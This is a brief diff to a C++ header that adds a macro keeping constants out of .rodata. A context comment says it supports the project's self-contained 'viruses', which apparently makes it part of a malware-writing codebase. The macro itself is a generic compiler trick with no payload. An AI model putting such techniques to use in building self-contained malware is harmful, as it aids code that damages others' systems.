@@ -24,6 +24,14 @@
   MAKE_COPYABLE(class_name);                  \
   MAKE_MOVABLE(class_name);
 
+// compile sometimes puts constants inside .rodata. Use this macro to disable
+// that.
+#define DO_NOT_OPTIMIZE_CONSTANT(x) \
+  [] {                              \
+    volatile auto ret = x;          \
+    return ret;                     \
+  }()
+
 // Problem:
 // Some syscall requires initialized string to work but our viruses must be
 // self-contained. Therefore they cannot reference strings stored in .rodata.
